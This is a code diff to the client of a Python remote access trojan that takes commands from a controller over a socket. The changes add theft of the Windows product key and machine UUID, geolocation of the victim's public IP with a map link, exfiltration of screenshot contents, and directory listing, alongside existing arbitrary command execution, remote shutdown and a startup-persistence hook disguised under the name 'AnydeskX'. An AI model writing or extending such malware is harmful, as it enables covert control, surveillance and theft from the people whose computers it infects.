@@ -20,7 +20,7 @@ import requests
 #############################################################################
 
 IP = 'localhost'
-PORT = 42069
+PORT = 6969
 
 #############################################################################
 
@@ -46,19 +46,44 @@ class Utils:
 
 #=====================================================================#
 
+    def get_windows_key():
+        try:
+            flags = 0x080000000
+            sh = "powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform' -Name BackupProductKeyDefault"
+            key_windows_find = (subprocess.check_output(sh, creationflags=flags).decode().rstrip())
+        except Exception:
+            key_windows_find = "N/A"
+        return key_windows_find
+    
+#=====================================================================#
+
+    def get_windows_uuid():
+        try:
+            flags = 0x080000000
+            sh = "wmic csproduct get uuid"
+            windows_uuid = (subprocess.check_output(sh, creationflags=flags).decode().split("\n")[1].strip())
+        except Exception:
+            windows_uuid = "N/A"
+        return windows_uuid
+
+#=====================================================================#
+
     def get_sysinfo():
 
-        ip = requests.get('https://api.ipify.org').content.decode('utf-8')
+        ip = requests.get('https://ipinfo.io/json').json()
 
         info = f"""
         ╭──────────────────╮
-        │               IP │ >> {ip}
-        │           System │ >> {platform.system()}  
-        │        Processor │ >> {platform.processor()}
-        │       Local Time │ >> {Utils.get_local_time()}
-        │     Architecture │ >> {platform.architecture()[0]}
-        │     Network Name │ >> {platform.node()}
-        │ Operating System │ >> {platform.platform()}
+        │               IP │ » {ip["ip"]}
+        │           System │ » {platform.system()}  
+        │        Processor │ » {platform.processor()}
+        │       Local Time │ » {Utils.get_local_time()}
+        │      Google Maps │ » {"https://www.google.com/maps/search/google+map++" + ip["loc"]}
+        │      Windows Key │ » {Utils.get_windows_key()}
+        │     Windows UUID │ » {Utils.get_windows_uuid()}
+        │     Architecture │ » {platform.architecture()[0]}
+        │     Network Name │ » {platform.node()}
+        │ Operating System │ » {platform.platform()}
         ╰──────────────────╯
         
         """
@@ -197,7 +222,7 @@ class RatConnector:
          while True:
             command = self.data_receive()
             try:
-                if command[0] == "exit":
+                if command[0] == "close":
                     self.connection.close()
                     sys.exit()
 
@@ -209,7 +234,7 @@ class RatConnector:
 
                 elif command[0] == "screenshot":
                     Utils.take_ss()
-                    commandResponse = f"[+] Filename: {screenshot_name}.png"
+                    commandResponse = self.read_file(screenshot_name + ".png").decode()
 
                 elif command[0] == "cd" and len(command) > 1:
                     os.chdir(str(command[1]).replace("~", " "))
@@ -237,7 +262,12 @@ class RatConnector:
                     commandResponse = "[+] Clients Monitor Screen is now on"
 
                 elif command[0] == "localtime":
-                    commandResponse = f"\tlocal time | {Utils.get_local_time()}"
+                    response = f"""
+        ╭─────────────────────╮
+        │ {Utils.get_local_time()} │
+        ╰─────────────────────╯
+                    """
+                    commandResponse = response
 
                 elif command[0] == "shutdown":
                     os.system("shutdown /s /t 1")
@@ -247,10 +277,13 @@ class RatConnector:
                 
                 elif command[0] == "sysinfo":
                     commandResponse = Utils.get_sysinfo()
+
+                elif command[0] == "ls" or command[0] == "dir":
+                    commandResponse = self.run_command("dir").decode('ISO-8859-1')
                 
                 else:
                     convCommand = self.array_to_string(command)
-                    commandResponse = self.run_command(convCommand).decode()
+                    commandResponse = self.run_command(convCommand)
             # Whole error handling, bad practice but required to keep connection
             except Exception as e:
                 commandResponse = f"[-] Error running command: {e}"
@@ -258,8 +291,8 @@ class RatConnector:
 
 #=====================================================================#
 
-if os.name == "nt":
-    Startup.addStartup('AnydeskX')
+# if os.name == "nt":
+#     Startup.addStartup('AnydeskX')
 
 ratClient = RatConnector(IP, PORT)
 ratClient.run()
